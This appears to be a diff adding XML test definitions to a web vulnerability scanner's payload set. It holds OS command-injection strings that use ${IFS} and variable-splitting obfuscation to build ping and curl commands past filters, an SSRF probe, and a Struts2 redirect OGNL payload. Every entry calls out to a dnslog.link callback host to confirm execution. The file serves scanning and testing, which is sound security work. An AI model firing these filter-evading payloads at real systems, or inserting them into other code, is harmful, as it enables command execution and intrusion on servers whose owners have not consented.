+			<info>Command Exec</info>
+		</details>
+	</test>
+	<test>
+		<title>OSCI [PAYLOAD] [<![CDATA[${IFS}|${IFS}ping${IFS}-c${IFS}2${IFS}[random].test.dnslog.link]]>]</title>
+		<stype>T</stype>
+		<tech>4</tech>
+		<level>level1</level>
+		<request>
+			<payload><![CDATA[${IFS}|${IFS}ping${IFS}-c${IFS}2${IFS}[random].test.dnslog.link]]></payload>
+		</request>
+		<response>
+			<url>http://admin.dnslog.link/api/dns/test/[random]/</url>
+			<grep>True</grep>
+		</response>
+		<details>
+			<versions>Linux</versions>
+			<info>Command Exec</info>
+		</details>
+	</test>
+	<test>
+		<title>OSCI [PAYLOAD] [<![CDATA[a=p;b=ing;c=c;d=2;$a$b{IFS}-$c{IFS}$d{IFS}[random].test.dnslog.link]]>]</title>
+		<stype>T</stype>
+		<tech>4</tech>
+		<level>level2</level>
+		<request>
+			<payload><![CDATA[a=p;b=ing;c=c;d=2;$a$b{IFS}-$c{IFS}$d{IFS}[random].test.dnslog.link]]></payload>
+		</request>
+		<response>
+			<url>http://admin.dnslog.link/api/dns/test/[random]/</url>
+			<grep>True</grep>
+		</response>
+		<details>
+			<versions>Linux</versions>
+			<info>Command Exec</info>
+		</details>
+	</test>
+	<test>
+		<title>OSCI [PAYLOAD] [<![CDATA[a=c;b=url;$a$b{IFS}[random].test.dnslog.link#]]>]</title>
+		<stype>T</stype>
+		<tech>4</tech>
+		<level>level2</level>
+		<request>
+			<payload><![CDATA[a=c;b=url;$a$b{IFS}[random].test.dnslog.link#]]></payload>
+		</request>
+		<response>
+			<url>http://admin.dnslog.link/api/dns/test/[random]/</url>
+			<grep>True</grep>
+		</response>
+		<details>
+			<versions>Linux</versions>
+			<info>Command Exec</info>
+		</details>
+	</test>
+	<!-- General ssrf payload -->
+	<test>
+		<title>SSRF [Payload] [<![CDATA[http://[random].test.dnslog.link/]]>]</title>
+		<stype>T</stype>
+		<tech>4</tech>
+		<level>level2</level>
+		<request>
+			<payload><![CDATA[http://[random].test.dnslog.link/]]></payload>
+		</request>
+		<response>
+			<url>http://admin.dnslog.link/api/dns/test/[random]/</url>
+			<grep>True</grep>
+		</response>
+		<details>
+			<versions>Linux,Windows</versions>
+			<info>SSRF</info>
+		</details>
+	</test>
+	<test>
+		<title>OSCI [PAYLOAD] [<![CDATA[?redirect:http://[random].test.dnslog.link/%25{3*4}]]>]</title>
+		<stype>S</stype>
+		<tech>4</tech>
+		<level>level2</level>
+		<request>
+			<payload><![CDATA[?redirect:http://[random].test.dnslog.link/%25{3*4}]]></payload>
+		</request>
+		<response>
+			<url>http://admin.dnslog.link/api/dns/test/[random]/</url>
+			<grep>True</grep>
+		</response>
+		<details>
+			<version>Linux,Windows</version>
+			<info>OSCI(strust2)</info>
+		</details>
+	</test>
+</root>
